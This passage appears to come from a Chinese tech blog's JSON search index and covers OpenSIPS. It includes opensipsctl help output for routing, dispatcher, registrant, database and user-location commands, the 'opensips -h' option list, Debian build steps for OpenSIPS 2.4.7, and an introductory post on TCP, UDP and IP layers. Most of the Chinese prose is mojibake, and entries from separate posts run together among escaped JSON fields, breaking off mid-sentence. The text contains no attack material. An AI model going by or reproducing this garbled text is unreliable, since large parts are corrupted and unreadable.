\u0026lt;routeid\u0026gt; \u0026lt;gwlist\u0026gt; \u0026lt;attrs\u0026gt; \u0026lt;description\u0026gt; ................................. add rule dr rmrule \u0026lt;ruleid\u0026gt; ................. delete rule dr reload .......................... reload dr tables dr gw_status ....................... show gateway status dr carrier_status .................. show carrier status -- command \u0026#39;dispatcher\u0026#39; - manage dispatcher * Examples: dispatcher addgw 1 sip:1.2.3.1:5050 \u0026#39;\u0026#39; 0 50 \u0026#39;og1\u0026#39; \u0026#39;Outbound Gateway1\u0026#39; * dispatcher addgw 2 sip:1.2.3.4:5050 \u0026#39;\u0026#39; 0 50 \u0026#39;og2\u0026#39; \u0026#39;Outbound Gateway2\u0026#39; * dispatcher rmgw 4 dispatcher show ..................... show dispatcher gateways dispatcher reload ................... reload dispatcher gateways dispatcher dump ..................... show in memory dispatcher gateways dispatcher addgw \u0026lt;setid\u0026gt; \u0026lt;destination\u0026gt; \u0026lt;socket\u0026gt; \u0026lt;state\u0026gt; \u0026lt;weight\u0026gt; \u0026lt;attrs\u0026gt; [description] .......................... add gateway dispatcher rmgw \u0026lt;id\u0026gt; ................ delete gateway -- command \u0026#39;registrant\u0026#39; - manage registrants * Examples: registrant add sip:opensips.org \u0026#39;\u0026#39; sip:user@opensips.org \u0026#39;\u0026#39; user password sip:user@localhost \u0026#39;\u0026#39; 3600 \u0026#39;\u0026#39; registrant show ......................... show registrant table registrant dump ......................... show registrant status registrant add \u0026lt;registrar\u0026gt; \u0026lt;proxy\u0026gt; \u0026lt;aor\u0026gt; \u0026lt;third_party_registrant\u0026gt; \u0026lt;username\u0026gt; \u0026lt;password\u0026gt; \u0026lt;binding_URI\u0026gt; \u0026lt;binding_params\u0026gt; \u0026lt;expiry\u0026gt; \u0026lt;forced_socket\u0026gt; . add a registrant registrant rm ........................... removes the entire registrant table registrant rmaor \u0026lt;id\u0026gt; ................... removes the gived aor id -- command \u0026#39;db\u0026#39; - database operations db exec \u0026lt;query\u0026gt; ..................... execute SQL query db roexec \u0026lt;roquery\u0026gt; ................. execute read-only SQL query db run \u0026lt;id\u0026gt; ......................... execute SQL query from $id variable db rorun \u0026lt;id\u0026gt; ....................... execute read-only SQL query from $id variable db show \u0026lt;table\u0026gt; ..................... display table content -- command \u0026#39;speeddial\u0026#39; - manage speed dials (short numbers) speeddial show \u0026lt;speeddial-id\u0026gt; ....... show speeddial details speeddial list \u0026lt;sip-id\u0026gt; ............. list speeddial for uri speeddial add \u0026lt;sip-id\u0026gt; \u0026lt;sd-id\u0026gt; \u0026lt;new-uri\u0026gt; [\u0026lt;desc\u0026gt;] ... ........................... add a speedial (*) speeddial rm \u0026lt;sip-id\u0026gt; \u0026lt;sd-id\u0026gt; ....... remove a speeddial (*) speeddial help ...................... help message - \u0026lt;speeddial-id\u0026gt;, \u0026lt;sd-id\u0026gt; must be an AoR (username@domain) - \u0026lt;sip-id\u0026gt; must be an AoR (username@domain) - \u0026lt;new-uri\u0026gt; must be a SIP AoR (sip:username@domain) - \u0026lt;desc\u0026gt; a description for speeddial -- command \u0026#39;avp\u0026#39; - manage AVPs avp list [-T table] [-u \u0026lt;sip-id|uuid\u0026gt;] [-a attribute] [-v value] [-t type] ... list AVPs avp add [-T table] \u0026lt;sip-id|uuid\u0026gt; \u0026lt;attribute\u0026gt; \u0026lt;type\u0026gt; \u0026lt;value\u0026gt; ............ add AVP (*) avp rm [-T table] [-u \u0026lt;sip-id|uuid\u0026gt;] [-a attribute] [-v value] [-t type] ... remove AVP (*) avp help .................................. help message - -T - table name - -u - SIP id or unique id - -a - AVP name - -v - AVP value - -t - AVP name and type (0 (str:str), 1 (str:int), 2 (int:str), 3 (int:int)) - \u0026lt;sip-id\u0026gt; must be an AoR (username@domain) - \u0026lt;uuid\u0026gt; must be a string but not AoR -- command \u0026#39;alias_db\u0026#39; - manage database aliases alias_db show \u0026lt;alias\u0026gt; .............. show alias details alias_db list \u0026lt;sip-id\u0026gt; ............. list aliases for uri alias_db add \u0026lt;alias\u0026gt; \u0026lt;sip-id\u0026gt; ...... add an alias (*) alias_db rm \u0026lt;alias\u0026gt; ................ remove an alias (*) alias_db help ...................... help message - \u0026lt;alias\u0026gt; must be an AoR (username@domain)\u0026#34; - \u0026lt;sip-id\u0026gt; must be an AoR (username@domain)\u0026#34; -- command \u0026#39;domain\u0026#39; - manage local domains domain reload ....................... reload domains from disk domain show ......................... show current domains in memory domain showdb ....................... show domains in the database domain add \u0026lt;domain\u0026gt; ................. add the domain to the database domain rm \u0026lt;domain\u0026gt; .................. delete the domain from the database -- command \u0026#39;cisco_restart\u0026#39; - restart CISCO phone (NOTIFY) cisco_restart \u0026lt;uri\u0026gt; ................ restart phone configured for \u0026lt;uri\u0026gt; -- command \u0026#39;online\u0026#39; - dump online users from memory online ............................. display online users -- command \u0026#39;monitor\u0026#39; - show internal status monitor ............................ show server\u0026#39;s internal status -- command \u0026#39;ping\u0026#39; - ping a SIP URI (OPTIONS) ping \u0026lt;uri\u0026gt; ......................... ping \u0026lt;uri\u0026gt; with SIP OPTIONS -- command \u0026#39;ul\u0026#39; - manage user location records ul show [\u0026lt;username\u0026gt;]................ show in-RAM online users ul show --brief..................... show in-RAM online users in short format ul rm \u0026lt;username\u0026gt; [\u0026lt;contact URI\u0026gt;].... delete user\u0026#39;s usrloc entries ul add \u0026lt;username\u0026gt; \u0026lt;uri\u0026gt; ............ introduce a permanent usrloc entry ul add \u0026lt;username\u0026gt; \u0026lt;uri\u0026gt; \u0026lt;expires\u0026gt; .. introduce a temporary usrloc entry -- command \u0026#39;fifo\u0026#39; fifo ............................... send raw FIFO command âœ ~ opopensipsctl ul /bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8) ERROR: usrloc - too few parameters -- command \u0026#39;ul\u0026#39; - manage user location records ul show [\u0026lt;username\u0026gt;]................ show in-RAM online users ul show --brief..................... show in-RAM online users in short format ul rm \u0026lt;username\u0026gt; [\u0026lt;contact URI\u0026gt;].... delete user\u0026#39;s usrloc entries ul add \u0026lt;username\u0026gt; \u0026lt;uri\u0026gt; ............ introduce a permanent usrloc entry ul add \u0026lt;username\u0026gt; \u0026lt;uri\u0026gt; \u0026lt;expires\u0026gt; .. introduce a temporary usrloc entry opensipså‘½ä»¤ opensips -h\næœ‰æ—¶å€™ï¼Œä½ ç”¨opensipsctl start å¯åŠ¨opensipsæ—¶ï¼Œä½ å¯èƒ½ä¼šæƒ³ï¼Œopensipsæ˜¯ä»å“ªä¸ªç›®å½•è¯»å–opensips.cfgæ–‡ä»¶çš„ï¼Œé‚£ä½ å¯ä»¥è¾“å…¥opensips -hã€‚è¾“å‡ºçš„ç»“æœï¼Œç¬¬ä¸€è¡Œå°±åŒ…æ‹¬äº†é»˜è®¤çš„é…ç½®æ–‡ä»¶çš„ä½ç½®ã€‚\n-f file Configuration file (default /usr/local//etc/opensips/opensips.cfg) -c Check configuration file for errors -C Similar to \u0026#39;-c\u0026#39; but in addition checks the flags of exported functions from included route blocks -l address Listen on the specified address/interface (multiple -l mean listening on more addresses). The address format is [proto:]addr[:port], where proto=udp|tcp and addr= host|ip_address|interface_name. E.g: -l locahost, -l udp:127.0.0.1:5080, -l eth0:5062 The default behavior is to listen on all the interfaces. -n processes Number of worker processes to fork per UDP interface (default: 8) -r Use dns to check if is necessary to add a \u0026#34;received=\u0026#34; field to a via -R Same as `-r` but use reverse dns; (to use both use `-rR`) -v Turn on \u0026#34;via:\u0026#34; host checking when forwarding replies -d Debugging mode (multiple -d increase the level) -D Run in debug mode -F Daemon mode, but leave main process foreground -E Log to stderr -N processes Number of TCP worker processes (default: equal to `-n`) -W method poll method -V Version number -h This help message -b nr Maximum receive buffer size which will not be exceeded by auto-probing procedure even if OS allows -m nr Size of shared memory allocated in Megabytes é»˜è®¤32MB -M nr Size of pkg memory allocated in Megabytes é»˜è®¤2MB -w dir Change the working directory to \u0026#34;dir\u0026#34; (default \u0026#34;/\u0026#34;) -t dir Chroot to \u0026#34;dir\u0026#34; -u uid Change uid -g gid Change gid -P file Create a pid file -G file Create a pgid file ","permalink":"https://wdd.js.org/opensips/ch3/opensipsctl/","summary":"å¯ä»¥ä½¿ç”¨ä¸€ä¸‹å‘½ä»¤æŸ¥æ‰¾opensipsçš„ç›¸å…³æ–‡ä»¶å¤¹\nfind / -name opensips -type d ä¸€èˆ¬æ¥è¯´ï¼Œé‡è¦çš„æ˜¯opensips.cfgæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸€èˆ¬ä½äº/usr/local/etc/opensips/æˆ–è€…/usr/etc/opensipsä¸­ã€‚ä¸»è¦è¿˜æ˜¯è¦çœ‹å®‰è£…æ—¶é€‰æ‹©çš„é»˜è®¤è·¯å¾„ã€‚\nå…¶ä¸­1.xç‰ˆæœ¬çš„é…ç½®æ–‡ä»¶ä¸€èˆ¬ä½äº/usr/etc/opensipsç›®å½•ä¸­ï¼Œ2.xç‰ˆæœ¬çš„é…ç½®ä¸€èˆ¬ä½äº/usr/local/etc/opensipsç›®å½•ä¸­ã€‚\nä¸‹é¢ä¸»è¦è®²è§£å‡ ä¸ªå‘½ä»¤ã€‚\né…ç½®æ–‡ä»¶æ ¡éªŒ æ ¡éªŒopensips.cfgè„šæœ¬æ˜¯å¦åˆæ³•, å¦‚æœæœ‰é—®é¢˜ï¼Œä¼šæç¤ºé‚£è¡Œä»£ç æœ‰é—®é¢˜ï¼Œä½†æ˜¯æŠ¥é”™ä½ç½®å¥½åƒä¸€ç›´ä¸å‡†ç¡®ã€‚å¾ˆå¤šæ—¶å€™å¯èƒ½æ˜¯å¿˜è®°å†™åˆ†å¥½äº†ã€‚\nopensips -C opensips.cfg å¯åŠ¨å…³é—­ä¸é‡å¯ ä½¿ç”¨opensipsctlå‘½ä»¤åšæ•°æ®åº“æ“ä½œå‰ï¼Œéœ€è¦å…ˆé…ç½®opensipsctlrcæ–‡ä»¶\nopensips start|stop|restart opensipsctl start|stop|restart èµ„æºåˆ›å»º opensipsdbctl create # åˆ›å»ºæ•°æ®åº“ opensipsctl domain add abc.cc #åˆ›å»ºåŸŸå opensipsctl add 1001@test.cc 12346 # æ–°å¢ç”¨æˆ· opensipsctl rm 1001@test.cc # åˆ é™¤ç”¨æˆ· opensipsctl passwdd 1001@test.cc 09879 # ä¿®æ”¹å¯†ç  opensipsctl -h æ˜¾ç¤ºæ‰€æœ‰å¯ç”¨å‘½ä»¤\n/usr/local/sbin/opensipsctl $Revision: 4448 $ Existing commands: -- command \u0026#39;start|stop|restart|trap\u0026#39; trap ............................... trap with gdb OpenSIPS processes restart ............................ restart OpenSIPS start .","title":"opensipsç®¡ç†å‘½ä»¤"},{"content":"1. å®‰è£…ä¾èµ– apt-get update -qq \u0026amp;\u0026amp; apt-get install -y build-essential net-tools \\ bison flex m4 pkg-config libncurses5-dev rsyslog libmysqlclient-dev \\ libssl-dev mysql-client libmicrohttpd-dev libcurl4-openssl-dev uuid-dev \\ libpcre3-dev libconfuse-dev libxml2-dev libhiredis-dev wget lsof 2. ç¼–è¯‘ ä¸‹è½½opensips-2.4.7çš„æºç ï¼Œç„¶åè§£å‹ã€‚\ninclude_modulså¯ä»¥æŒ‰éœ€æŒ‡å®šï¼Œä½ å¯ä»¥åªå†™ä½ éœ€è¦çš„æ¨¡å—ã€‚\ncd /usr/local/src/opensips-2.4.7 make all -j4 include_modules=\u0026#34;db_mysql httpd db_http siprec regex rest_client carrierroute dialplan b2b_logic cachedb_redis proto_tls proto_wss tls_mgm\u0026#34; make install include_modules=\u0026#34;db_mysql httpd db_http siprec regex rest_client carrierroute dialplan b2b_logic cachedb_redis proto_tls proto_wss tls_mgm\u0026#34; ","permalink":"https://wdd.js.org/opensips/ch3/install-opensips/","summary":"1. å®‰è£…ä¾èµ– apt-get update -qq \u0026amp;\u0026amp; apt-get install -y build-essential net-tools \\ bison flex m4 pkg-config libncurses5-dev rsyslog libmysqlclient-dev \\ libssl-dev mysql-client libmicrohttpd-dev libcurl4-openssl-dev uuid-dev \\ libpcre3-dev libconfuse-dev libxml2-dev libhiredis-dev wget lsof 2. ç¼–è¯‘ ä¸‹è½½opensips-2.4.7çš„æºç ï¼Œç„¶åè§£å‹ã€‚\ninclude_modulså¯ä»¥æŒ‰éœ€æŒ‡å®šï¼Œä½ å¯ä»¥åªå†™ä½ éœ€è¦çš„æ¨¡å—ã€‚\ncd /usr/local/src/opensips-2.4.7 make all -j4 include_modules=\u0026#34;db_mysql httpd db_http siprec regex rest_client carrierroute dialplan b2b_logic cachedb_redis proto_tls proto_wss tls_mgm\u0026#34; make install include_modules=\u0026#34;db_mysql httpd db_http siprec regex rest_client carrierroute dialplan b2b_logic cachedb_redis proto_tls proto_wss tls_mgm\u0026#34; ","title":"debian jessie opensips 2.4.7 å®‰è£…"},{"content":"å¦‚ä½•å­¦ä¹ ç½‘ç»œåè®®ï¼Ÿ å¤§å­¦æ—¶ï¼Œå­¦åˆ°ç½‘ç»œåè®®çš„7å±‚æ¨¡å‹æ—¶ï¼Œè€å¸ˆæ•™äº†å¤§å®¶ä¸€ä¸ªé¡ºå£æºœï¼šç‰©æ•°ç½‘ä¼ ä¼šè¡¨åº”ã€‚å¹¶è¯´è¿™æ˜¯é‡ç‚¹ï¼Œå¹´å¹´å¿…è€ƒï¼Œ5åˆ†çš„é¢˜ç›®æ‘†åœ¨è¿™é‡Œï¼Œä½ ä»¬çˆ±èƒŒä¸èƒŒã€‚ è€ƒè¯•çš„æ—¶å€™ï¼Œæœç„¶é‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Œæœç´¢æ¯è‚ ï¼Œåªèƒ½æƒ³åˆ°è¿™7ä¸ªå­—çš„ç¬¬ä¸€ä¸ªå­—ï¼Œå› ä¸ºè¿™5åˆ†ï¼Œå·®ç‚¹æŒ‚ç§‘ã€‚ åæ¥å·¥ä½œé¢è¯•ï¼Œé¢è¯•å®˜ä¹Ÿæ˜¯å¾ˆå–œæ¬¢ä¸ƒå±‚æ¨¡å‹ï¼Œä¸‰æ¬¡æ¡æ‰‹ä¹‹ç±»çš„é—®é¢˜ï¼Œä½†æ˜¯é‡åˆ°è¿™äº›é—®é¢˜æ—¶ï¼Œæ€»æ˜¯è§‰å¾—å¾ˆå¿ƒè™šã€‚\n1. åè®®åˆ†å±‚ å››å±‚ç½‘ç»œåè®®æ¨¡å‹ä¸­ï¼Œåº”ç”¨å±‚ä»¥ä¸‹ä¸€èˆ¬éƒ½æ˜¯äº¤ç»™æ“ä½œç³»ç»Ÿæ¥å¤„ç†ã€‚åº”ç”¨å±‚å¯¹äºå››å±‚æ¨¡å‹æ¥è¯´ï¼Œä»…ä»…æ˜¯å†°å±±ä¸€è§’ã€‚æµ·é¢ä¸‹å·¨å¤æ‚çš„ä¸‰å±‚åè®®ï¼Œéƒ½è¢«æ“ä½œç³»ç»Ÿç»™éšè—èµ·æ¥äº†ï¼Œä¸€èˆ¬æˆ‘ä»¬åœ¨é¡µé¢ä¸Šå‘èµ·ä¸€ä¸ªajaxè¯·æ±‚ï¼Œçœ‹è§äº†networké¢æ¿å¤šäº†ä¸€ä¸ªhttpè¯·æ±‚ï¼Œè‡³äºåº•å±‚æ˜¯å¦‚ä½•å®ç°çš„ï¼Œæˆ‘ä»¬å¹¶ä¸å…³å¿ƒã€‚\nåº”â½¤å±‚è´Ÿè´£å¤„ç†ç‰¹å®šçš„åº”â½¤ç¨‹åºç»†èŠ‚ã€‚ è¿è¾“å±‚è¿è¾“å±‚ä¸»è¦ä¸ºä¸¤å°ä¸»æœºä¸Šçš„åº”â½¤ç¨‹åºæä¾›ç«¯åˆ°ç«¯çš„é€šä¿¡ã€‚ ç½‘ç»œå±‚å¤„ç†ï§¤åˆ†ç»„åœ¨â½¹ç½‘ç»œä¸­çš„æ´»åŠ¨ï¼Œä¾‹ï¦µå¦‚åˆ†ç»„çš„é€‰è·¯ é“¾è·¯å±‚å¤„ç†ï§¤ä¸ç”µç¼†(æˆ–å…¶ä»–ä»»ä½•ä¼ è¾“åª’ä»‹)çš„ç‰©ç†ï§¤æ¥â¼å£ç»†èŠ‚ ä¸‹é¢é‡ç‚¹è®²ä¸€ä¸‹è¿è¾“å±‚å’Œç½‘ç»œå±‚\n1.1. è¿è¾“å±‚çš„ä¸¤å…„å¼Ÿ è¿è¾“å±‚æœ‰ä¸¤ä¸ªæ¯”è¾ƒé‡è¦çš„åè®®ã€‚tcpå’Œudpã€‚\nå¤§å“¥tcpæ˜¯æ¯”è¾ƒä¸¥è°¨è®¤çœŸã€æ¸©æŸ”ä½“è´´ã€æ…¢çƒ­å†…å‘çš„åè®®ï¼Œå‘å‡ºå»çš„æ¶ˆæ¯ï¼Œæ€»æ˜¯ä¸€ä¸ªä¸€ä¸ªè®¤çœŸæ£€æŸ¥ï¼Œç­‰å¾…å¯¹æ–¹å›å¤å’Œç¡®è®¤ï¼Œå¦‚æœä¸€æ®µæ—¶é—´å†…ï¼Œå¯¹æ–¹æ²¡æœ‰å›å¤ç¡®è®¤æ¶ˆæ¯ï¼Œè¿˜ä¼šå†æ¬¡å‘é€æ¶ˆæ¯ï¼Œå¦‚æœå¯¹æ–¹å›å¤è¯´ä½ å‘çš„å¤ªå¿«äº†ï¼Œtcpè¿˜ä¼šä½“è´´çš„æŠŠå‘é€æ¶ˆæ¯çš„é€Ÿåº¦é™ä½ã€‚\nå¼Ÿå¼Ÿudpåˆ™æ¯”è¾ƒå¯çˆ±å‘†èŒã€è°ƒçš®å¥½åŠ¨ã€ä¸è´Ÿè´£ä»»çš„åè®®ã€‚å“¥å“¥tcpæ‰€å…·æœ‰çš„ç‰¹ç‚¹ï¼Œå¼Ÿå¼Ÿudpä¸€ä¸ªä¹Ÿæ²¡æœ‰ã€‚ä½†æ˜¯æœ‰çš„äººè¯´ä¸æ¸…å“ªé‡Œå¥½ ä½†å°±æ˜¯è°éƒ½æ›¿ä»£ä¸äº†ï¼Œudpæ²¡æœ‰tcpé‚£äº›å¤æ‚çš„æ ¡éªŒå’Œé‡ä¼ ç­‰å¤æ‚çš„æ­¥éª¤ï¼Œæ‰€ä»¥å®ƒå‘é€æ¶ˆæ¯éå¸¸å¿«ï¼Œè€Œä¸”å¹¶ä¸ä¿è¯å¯¹æ–¹ä¸€å®šæ”¶åˆ°ã€‚å¦‚æœå¯¹æ–¹æ”¶ä¸åˆ°æ¶ˆæ¯ï¼Œé‚£ä¹ˆudpå°±ä¼šå‘†èŒçš„çœ‹ç€ä½ ï¼Œç¬‘ç€å¯¹ä½ è¯´ï¼šæˆ‘å·²ç»å°½åŠ›äº†ã€‚ä¸€èˆ¬è¯­éŸ³è€Œè§†é¢‘æ•°æ®éƒ½æ˜¯ç”¨udpåè®®ä¼ è¾“çš„ï¼Œå› ä¸ºéŸ³é¢‘æˆ–è€…è§†é¢‘å¡äº†ä¸€ä¸‹å¹¶ä¸å½±å“æ•´ä½“çš„è´¨é‡ï¼Œè€Œå¯¹å®æ—¶æ€§çš„è¦æ±‚ä¼šæ›´é«˜ã€‚\n1.2. è¿è¾“å±‚å’Œç½‘ç»œå±‚çš„åŒºåˆ« è¿è¾“å±‚å…³æ³¨çš„æ˜¯ç«¯åˆ°ç«¯å±‚é¢ï¼ŒåŠEnd1åˆ°End2ï¼Œå¿½ç•¥ä¸­é—´çš„ä»»ä½•ç‚¹ã€‚ ç½‘ç»œå±‚å…³æ³¨ä¸¤ç‚¹ä¹‹é—´çš„å±‚é¢ï¼Œå³hop1å¦‚ä½•åˆ°hop2ï¼Œhop2å¦‚ä½•åˆ°hop3 ç½‘ç»œå±‚å¹¶ä¸ä¿è¯æ¶ˆæ¯å¯é æ€§ï¼Œå¯é æ€§ä¸Šå±‚çš„ä¼ è¾“å±‚è´Ÿè´£ã€‚TCPé‡‡ç”¨è¶…æ—¶é‡ä¼ ï¼Œåˆ†ç»„ç¡®è®¤çš„æœºåˆ¶ï¼Œä¿è¯æ¶ˆæ¯ä¸ä¼šä¸¢å¤±ã€‚ ä»ä¸‹å›¾tcp, udp, ipåè®®ä¸­ï¼Œå¯ä»¥å‘ç°\nä¼ è¾“å±‚çš„tcpå’Œudpéƒ½æ˜¯æœ‰æºç«¯å£å’Œç›®çš„ç«¯å£ï¼Œä½†æ˜¯æ²¡æœ‰ipå­—æ®µ æºipå’Œç›®çš„ipåªåœ¨ipæ•°æ®æŠ¥ä¸­ ç†è§£å„ä¸ªåè®®ï¼Œå…³é”®åœ¨äºç†è§£æŠ¥æ–‡çš„å„ä¸ªå­—æ®µçš„å«ä¹‰ 1.3. ipå’Œç«¯å£å·çš„çœŸæ­£å«ä¹‰ ä¸Šä¸ªç« èŠ‚è®²åˆ°è¿è¾“å±‚å’Œç½‘ç»œå±‚çš„åŒºåˆ«ï¼Œå…¶ä¸­ç«¯å£å·è¢«å°è£…åœ¨è¿è¾“å±‚ï¼Œipè¢«å°è£…åˆ°ç½‘ç»œæˆï¼Œ\né‚£ä¹ˆç«¯å£å·å’Œipåœ°å€åˆ°åº•æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ\nipç”¨æ¥ç”¨æ¥æ ‡è®°ä¸»æœºçš„ä½ç½® ç«¯å£å·ç”¨æ¥æ ‡è®°è¯¥æ•°æ®åº”è¯¥è¢«ç›®æ ‡ä¸»æœºä¸Šçš„å“ªä¸ªåº”ç”¨ç¨‹åºå»å¤„ç† 1.4. æ•°æ®åœ¨åè®®æ ˆçš„æµåŠ¨ å°è£…ä¸åˆ†ç”¨ å½“å‘é€æ¶ˆæ¯æ—¶ï¼Œæ•°æ®åœ¨å‘ä¸‹ä¼ é€’æ—¶ï¼Œç»è¿‡ä¸åŒå±‚æ¬¡çš„åè®®å¤„ç†ï¼Œæ‰“ä¸Šå„ç§å¤´éƒ¨ä¿¡æ¯ å½“æ¥å—æ¶ˆæ¯æ—¶ï¼Œæ•°æ®åœ¨å‘ä¸Šä¼ é€’ï¼Œé€šè¿‡ä¸åŒçš„å¤´éƒ¨ä¿¡æ¯å­—æ®µï¼Œæ‰çŸ¥é“è¦äº¤ç»™ä¸Šå±‚çš„é‚£ä¸ªæ¨¡å—æ¥å¤„ç†ã€‚æ¯”å¦‚ä¸€ä¸ªipåŒ…ï¼Œå¦‚æœæ²¡æœ‰å¤´éƒ¨ä¿¡æ¯ï¼Œé‚£ä¹ˆè¿™ä¸ªæ¶ˆæ¯ç©¶ç«Ÿæ˜¯äº¤ç»™tcpåè®®æ¥å¤„ç†ï¼Œè¿˜æ˜¯udpæ¥å¤„ç†ï¼Œå°±ä¸å¾—è€ŒçŸ¥äº† 2. æ·±å…¥é˜…è¯»ï¼Œå¥½ä¹¦æ¨è ã€Šhttpæƒå¨æŒ‡å—ã€‹ æœ‰äººè¯´è¿™æœ¬ä¹¦å¤ªåšï¼Œå·å·å‘Šè¯‰ä½ ï¼Œå…¶å®è¿™æœ¬ä¹¦å¹¶åšï¼Œå› ä¸ºè¿™æœ¬ä¹¦çš„åé¢çš„30%éƒ¨åˆ†éƒ½æ˜¯é™„å½•ï¼Œè¿™æœ¬ä¹¦çš„ç²¾åæ˜¯å‰50%çš„éƒ¨åˆ† ã€Šå›¾è§£httpã€‹ã€ã€Šå›¾è§£tcp/ipã€‹è¿™ä¸¤æœ¬å›¾è§£çš„ä¹¦ï¼ŒçŸ¥è¯†ç‚¹è®²çš„éƒ½æ˜¯æ¯”è¾ƒé€šä¿—æ˜“æ‡‚çš„ï¼Œé€‚åˆå…¥é—¨ ã€Štcp/ip è¯¦è§£ å·1ã€‹è¿™æœ¬ä¹¦ï¼Œè®©ä½ çŸ¥å…¶ç„¶ï¼Œæ›´çŸ¥å…¶æ‰€ä»¥ç„¶ ã€Štcp/ip åŸºç¡€ã€‹ã€ã€Štcp/ip è·¯ç”±æŠ€æœ¯ã€‹è¿™ä¸¤æœ¬ä¹¦ï¼Œä¼šè®©ä½ ä»ä¸åŒè§’åº¦æ€è€ƒåè®® ã€Šç²¾é€šwiresharkã€‹ã€ã€Šwiresharkç½‘ç»œåˆ†æå®æˆ˜ã€‹å¦‚æœä½ çœ‹äº†å¾ˆå¤šä¹¦ï¼Œå´ä»æ¥æ²¡æœ‰è¯•è¿‡ç½‘ç»œæŠ“åŒ…ï¼Œé‚£ä½ åªæ˜¯æ‡‚çº¸ä¸Šè°ˆå…µç½¢äº†ã€‚ä½ æ°¸è¿œæ— æ³•ç†è§£tcpä¸‰æ¬¡æ¡æ‰‹çš„æ€¦ç„¶å¿ƒåŠ¨ï¼Œä¸å››æ¬¡åˆ†æ‰‹çš„åˆ»éª¨é“­å¿ƒã€‚ ","permalink":"https://wdd.js.org/posts/2019/01/books-about-network-protocol/","summary":"å¦‚ä½•å­¦ä¹ ç½‘ç»œåè®®ï¼Ÿ å¤§å­¦æ—¶ï¼Œå­¦åˆ°ç½‘ç»œåè®®çš„7å±‚æ¨¡å‹æ—¶ï¼Œè€å¸ˆæ•™äº†å¤§å®¶ä¸€ä¸ªé¡ºå£æºœï¼šç‰©æ•°ç½‘ä¼ ä¼šè¡¨åº”ã€‚å¹¶è¯´è¿™æ˜¯é‡ç‚¹ï¼Œå¹´å¹´å¿…è€ƒï¼Œ5åˆ†çš„é¢˜ç›®æ‘†åœ¨è¿™é‡Œï¼Œä½ ä»¬çˆ±èƒŒä¸èƒŒã€‚ è€ƒè¯•çš„æ—¶å€™ï¼Œæœç„¶é‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Œæœç´¢æ¯è‚ ï¼Œåªèƒ½æƒ³åˆ°è¿™7ä¸ªå­—çš„ç¬¬ä¸€ä¸ªå­—ï¼Œå› ä¸ºè¿™5åˆ†ï¼Œå·®ç‚¹æŒ‚ç§‘ã€‚ åæ¥å·¥ä½œé¢è¯•ï¼Œé¢è¯•å®˜ä¹Ÿæ˜¯å¾ˆå–œæ¬¢ä¸ƒå±‚æ¨¡å‹ï¼Œä¸‰æ¬¡æ¡æ‰‹ä¹‹ç±»çš„é—®é¢˜ï¼Œä½†æ˜¯é‡åˆ°è¿™äº›é—®é¢˜æ—¶ï¼Œæ€»æ˜¯è§‰å¾—å¾ˆå¿ƒè™šã€‚\n1. åè®®åˆ†å±‚ å››å±‚ç½‘ç»œåè®®æ¨¡å‹ä¸­ï¼Œåº”ç”¨å±‚ä»¥ä¸‹ä¸€èˆ¬éƒ½æ˜¯äº¤ç»™æ“ä½œç³»ç»Ÿæ¥å¤„ç†ã€‚åº”ç”¨å±‚å¯¹äºå››å±‚æ¨¡å‹æ¥è¯´ï¼Œä»…ä»…æ˜¯å†°å±±ä¸€è§’ã€‚æµ·é¢ä¸‹å·¨å¤æ‚çš„ä¸‰å±‚åè®®ï¼Œéƒ½è¢«æ“ä½œç³»ç»Ÿç»™éšè—èµ·æ¥äº†ï¼Œä¸€èˆ¬æˆ‘ä»¬åœ¨é¡µé¢ä¸Šå‘èµ·ä¸€ä¸ªajaxè¯·æ±‚ï¼Œçœ‹è§äº†networké¢æ¿å¤šäº†ä¸€ä¸ªhttpè¯·æ±‚ï¼Œè‡³äºåº•å±‚æ˜¯å¦‚ä½•å®ç°çš„ï¼Œæˆ‘ä»¬å¹¶ä¸å…³å¿ƒã€‚\nåº”â½¤å±‚è´Ÿè´£å¤„ç†ç‰¹å®šçš„åº”â½¤ç¨‹åºç»†èŠ‚ã€‚ è¿è¾“å±‚è¿è¾“å±‚ä¸»è¦ä¸ºä¸¤å°ä¸»æœºä¸Šçš„åº”â½¤ç¨‹åºæä¾›ç«¯åˆ°ç«¯çš„é€šä¿¡ã€‚ ç½‘ç»œå±‚å¤„ç†ï§¤åˆ†ç»„åœ¨â½¹ç½‘ç»œä¸­çš„æ´»åŠ¨ï¼Œä¾‹ï¦µå¦‚åˆ†ç»„çš„é€‰è·¯ é“¾è·¯å±‚å¤„ç†ï§¤ä¸ç”µç¼†(æˆ–å…¶ä»–ä»»ä½•ä¼ è¾“åª’ä»‹)çš„ç‰©ç†ï§¤æ¥â¼å£ç»†èŠ‚ ä¸‹é¢é‡ç‚¹è®²ä¸€ä¸‹è¿è¾“å±‚å’Œç½‘ç»œå±‚\n1.1. è¿è¾“å±‚çš„ä¸¤å…„å¼Ÿ è¿è¾“å±‚æœ‰ä¸¤ä¸ªæ¯”è¾ƒé‡è¦çš„åè®®ã€‚tcpå’Œudpã€‚\nå¤§å“¥tcpæ˜¯æ¯”è¾ƒä¸¥è°¨è®¤çœŸã€æ¸©æŸ”ä½“è´´ã€æ…¢çƒ­å†…å‘çš„åè®®ï¼Œå‘å‡ºå»çš„æ¶ˆæ¯ï¼Œæ€»æ˜¯ä¸€ä¸ªä¸€ä¸ªè®¤çœŸæ£€æŸ¥ï¼Œç­‰å¾…å¯¹æ–¹å›å¤å’Œç¡®è®¤ï¼Œå¦‚æœä¸€æ®µæ—¶é—´å†…ï¼Œå¯¹æ–¹æ²¡æœ‰å›å¤ç¡®è®¤æ¶ˆæ¯ï¼Œè¿˜ä¼šå†æ¬¡å‘é€æ¶ˆæ¯ï¼Œå¦‚æœå¯¹æ–¹å›å¤è¯´ä½ å‘çš„å¤ªå¿«äº†ï¼Œtcpè¿˜ä¼šä½“è´´çš„æŠŠå‘é€æ¶ˆæ¯çš„é€Ÿåº¦é™ä½ã€‚\nå¼Ÿå¼Ÿudpåˆ™æ¯”è¾ƒå¯çˆ±å‘†èŒã€è°ƒçš®å¥½åŠ¨ã€ä¸è´Ÿè´£ä»»çš„åè®®ã€‚å“¥å“¥tcpæ‰€å…·æœ‰çš„ç‰¹ç‚¹ï¼Œå¼Ÿå¼Ÿudpä¸€ä¸ªä¹Ÿæ²¡æœ‰ã€‚ä½†æ˜¯æœ‰çš„äººè¯´ä¸æ¸…å“ªé‡Œå¥½ 